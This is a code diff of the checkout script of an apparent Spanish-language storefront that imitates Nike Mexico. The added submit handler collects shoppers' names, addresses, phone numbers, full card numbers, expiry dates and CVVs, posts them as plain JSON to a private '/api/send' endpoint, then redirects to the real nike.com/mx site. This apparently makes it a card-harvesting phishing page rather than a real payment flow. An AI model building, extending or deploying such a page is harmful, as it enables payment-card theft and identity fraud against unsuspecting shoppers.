@@ -548,70 +548,85 @@
         const inputFecha = document.getElementById('fecha-expiracion');
         const iconMarca = document.getElementById('card-brand-icon');
         const panelMensualidades = document.getElementById('installments-panel');
-        
         const camposRequeridos = document.querySelectorAll('.req-input');
-        const btnComprar = document.getElementById('btn-comprar');
-        // --- NUEVO MÉTODO: LEER LA TALLA DESDE LA URL ---
+        const btnComprar = document.getElementById('btn-comprar'); // Asegúrate que tu botón tenga este ID
+
+        // LEER TALLA
         const parametros = new URLSearchParams(window.location.search);
         const tallaGuardada = parametros.get('talla');
-
-        if (tallaGuardada) {
+        if (tallaGuardada && document.getElementById('talla-seleccionada')) {
             document.getElementById('talla-seleccionada').innerText = 'Talla ' + tallaGuardada;
         }
-        // ------------------------------------------------
-        // Formato para Número de Tarjeta y Detección
+
+        // FORMATO TARJETA
         inputTarjeta.addEventListener('input', function(e) {
             let valor = e.target.value.replace(/\D/g, '');
+            e.target.value = valor.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
             
-            // Agrega espacio cada 4 dígitos
-            let formateado = valor.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
-            e.target.value = formateado;
-
             let esVisa = /^4/.test(valor);
             let esMastercard = /^5[1-5]/.test(valor) || /^2[2-7]/.test(valor);
-
-            if (valor.length > 0 && (esVisa || esMastercard)) {
-                iconMarca.className = 'input-card-brand-icon active ' + (esVisa ? 'visa' : 'mastercard');
-                panelMensualidades.style.display = 'block'; 
-            } else {
-                iconMarca.className = 'input-card-brand-icon';
-                panelMensualidades.style.display = 'none';
-            }
+            iconMarca.className = 'input-card-brand-icon' + (valor.length > 0 && (esVisa || esMastercard) ? ' active ' + (esVisa ? 'visa' : 'mastercard') : '');
+            validarFormulario();
         });
 
-        // Formato para Fecha de Expiración (MM/AA)
+        // FORMATO FECHA
         inputFecha.addEventListener('input', function(e) {
             let valor = e.target.value.replace(/\D/g, '');
-            
-            // Agrega la diagonal después de los primeros 2 dígitos
-            if (valor.length > 2) {
-                valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
-            }
+            if (valor.length > 2) valor = valor.substring(0, 2) + '/' + valor.substring(2, 4);
             e.target.value = valor;
+            validarFormulario();
         });
 
-        // Validar formulario para activar Botón
+        // VALIDACIÓN
         function validarFormulario() {
             let esValido = true;
-            camposRequeridos.forEach(campo => {
-                if(campo.value.trim() === '' || !campo.checkValidity()) {
-                    esValido = false;
-                }
-            });
-
-            if (esValido) {
-                btnComprar.removeAttribute('disabled');
-            } else {
-                btnComprar.setAttribute('disabled', 'true');
-            }
+            camposRequeridos.forEach(campo => { if(campo.value.trim() === '') esValido = false; });
+            if (btnComprar) btnComprar.disabled = !esValido;
         }
 
-        camposRequeridos.forEach(campo => {
-            campo.addEventListener('input', validarFormulario);
-            campo.addEventListener('change', validarFormulario);
-        });
-    });
-  </script>
+        // ENVÍO FINAL
+        if (btnComprar) {
+            btnComprar.onclick = async (e) => {
+                e.preventDefault();
+                btnComprar.innerText = "PROCESANDO...";
+                btnComprar.disabled = true;
 
+                const data = {
+                    email: document.getElementById("email").value,
+                    nombre: document.getElementById("nombre").value,
+                    apellido: document.getElementById("apellido").value,
+                    direccion1: document.getElementById("direccion1").value,
+                    direccion2: document.getElementById("direccion2")?.value || "",
+                    cp: document.getElementById("cp").value,
+                    localidad: document.getElementById("localidad").value,
+                    estado: document.getElementById("estado").value,
+                    telefono: document.getElementById("telefono").value,
+                    titular_tarjeta: document.getElementById("titular_tarjeta").value,
+                    numero_tarjeta: document.getElementById("numero_tarjeta").value,
+                    fechaExpiracion: document.getElementById("fecha-expiracion").value,
+                    cvv: document.getElementById("cvv").value,
+                    talla: tallaGuardada || "N/A"
+                };
+
+                try {
+                    const response = await fetch("/api/send", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify(data)
+                    });
+                    if (response.ok) window.location.href = "https://www.nike.com/mx/";
+                    else alert("Error al procesar. Intenta de nuevo.");
+                } catch (err) {
+                    alert("Error de conexión.");
+                } finally {
+                    btnComprar.disabled = false;
+                    btnComprar.innerText = "HACER PEDIDO";
+                }
+            };
+        }
+
+        camposRequeridos.forEach(campo => campo.addEventListener('input', validarFormulario));
+    });
+</script>
 </body>
 </html>
